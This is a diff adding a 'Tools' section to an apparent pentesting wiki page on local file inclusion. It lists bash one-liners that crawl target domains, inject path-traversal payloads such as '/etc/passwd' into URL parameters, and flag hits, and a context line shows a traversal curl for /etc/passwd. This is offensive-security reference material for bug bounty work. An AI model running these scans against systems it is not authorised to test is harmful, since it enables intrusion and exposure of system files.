@@ -34,6 +34,38 @@ curl 'http://10.10.10.8/../../../../etc/passwd' --path-as-is
 ```
 {% endhint %}
 
+#### Tools
+
+{% tabs %}
+{% tab title="One-Liners" %}
+Here are some handy one-liners to automate LFI scans on domains or urls using tools like [gau](https://github.com/lc/gau), [hakrawler](https://github.com/hakluke/hakrawler), [waybackurls](https://github.com/tomnomnom/waybackurls), [katana](https://github.com/projectdiscovery/katana), [uro](https://github.com/s0md3v/uro), [qsreplace](https://github.com/tomnomnom/qsreplace), [httpx](https://github.com/projectdiscovery/httpx), [Gospider](https://github.com/jaeles-project/gospider).
+
+{% hint style="success" %}
+It may be usefull for bug bounty hunting
+{% endhint %}
+
+{% hint style="info" %}
+**domains.txt** -> text file containing domain names (ex: test.domain.com)
+
+**urls.txt** -> text file containing URLs (ex: http://test.domain.com)
+{% endhint %}
+
+```bash
+# Curl, wordlist
+# You may want to edit the wordlist
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | xargs -I% -P 25 sh -c 'for payload in $(cat /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt); do url=$(echo "%" | qsreplace "$payload"); curl -s "$url" 2>&1 | grep -q "root:x" && echo "VULN! $url"; done'
+
+# Curl, single payload
+# You may want to edit the payload
+cat domains.txt | (gau || hakrawler || waybackurls || katana) | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+
+# GoSpider, signe payload
+# You may want to edit the payload
+gospider -S urls.txt -c 10 -d 5 --blacklist ".(gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}' gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
+```
+{% endtab %}
+{% endtabs %}
+
 #### Basic LFI
 
 {% tabs %}
